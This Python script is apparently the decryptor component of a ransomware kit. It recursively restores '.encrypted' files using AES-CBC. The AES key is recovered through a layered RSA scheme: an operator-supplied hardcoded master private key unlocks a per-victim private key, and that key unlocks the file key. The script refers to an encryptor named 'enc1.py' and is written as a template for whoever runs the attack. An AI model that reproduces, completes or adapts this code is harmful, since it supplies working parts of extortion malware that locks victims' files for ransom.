from Crypto.Cipher import AES, PKCS1_OAEP
import os, random, sys
import struct
from Crypto.PublicKey import RSA

def decrypt(key,path):
    os.chdir(path)
    files=os.listdir('.')
    for fil in files:
        if os.path.isdir(f"{fil}"):
            path1=f"{path}/{fil}"
            decrypt(key,path1)
            os.chdir(f"{path}")
            continue
        filn = fil.split('.')
        if filn[1]=='encrypted' and fil!='enc1.py' and fil!='key.key':
            input_file = f"{fil}"
            fi=filn[0].split('_')
            f=fi[-1:]
            ff=f[0]
            fo=fi[:(len(fi)-1)]
            filnam = '_'.join(fo)
            #print(filnam)
            output_file = f"{filnam}.{ff}"

            with open(input_file,'rb') as fin:
                fsz = struct.unpack('<Q', fin.read(struct.calcsize('Q')))[0]
                iv = fin.read(16)
                chunksize = 2048
                aes = AES.new(key, AES.MODE_CBC, iv)

                with open(output_file, 'wb') as fout:
                    while True:
                        chunk = fin.read(chunksize)
                        if len(chunk) == 0:
                            break
                        fout.write(aes.decrypt(chunk))

                    fout.truncate(fsz)

            os.remove(f"{fil}")

os.chdir('README')

file = open('key.key', 'rb')
enc_key = file.read() # The key will be type bytes
file.close()

file = open('key1.key', 'rb')
key1_enc = file.read() # The key will be type bytes
file.close()

spriv=b'''your hardcoded rsa private key or import .pem file directly in the next line'''
#spriv = RSA.import_key(open("your-key-name.pem").read())
keypub = RSA.import_key(spriv)
cipher_rsa1 = PKCS1_OAEP.new(keypub)
key1 = cipher_rsa1.decrypt(key1_enc)


with open("private_pem.encrypted",'rb') as fin:
    fsz = struct.unpack('<Q', fin.read(struct.calcsize('Q')))[0]
    iv1 = fin.read(16)
    chunksize = 2048
    aes1 = AES.new(key1, AES.MODE_CBC, iv1)

    with open("private.pem", 'wb') as fout:
        while True:
            chunk = fin.read(chunksize)
            if len(chunk) == 0:
                break
            fout.write(aes1.decrypt(chunk))

        fout.truncate(fsz)

os.remove("private_pem.encrypted")



private_key = RSA.import_key(open("private.pem").read())
cipher_rsa = PKCS1_OAEP.new(private_key)
key = cipher_rsa.decrypt(enc_key)

os.chdir('..')

path=os.getcwd()
decrypt(key,path)
